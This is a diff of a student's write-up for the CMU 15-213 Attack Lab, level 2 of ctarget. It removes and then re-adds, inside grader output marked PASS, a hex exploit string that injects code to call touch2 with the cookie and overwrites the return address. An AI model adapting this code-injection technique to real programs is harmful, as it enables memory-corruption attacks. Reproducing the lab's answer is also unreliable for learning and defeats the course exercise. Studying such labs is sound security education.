@@ -234,10 +234,15 @@ void touch2(unsigned val)
 
 ```
 
-`48 C7 C7 FA 97 B9 59 48 C7 44 24 00 EC 17 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 78 DC 61 55 00 00 00 00`
-
 ```c
-
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 48 C7 44 24 00 EC 17 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 78 DC 61 55 00 00 00 00
+[Inferior 1 (process 923) exited normally]
 ```
 
 
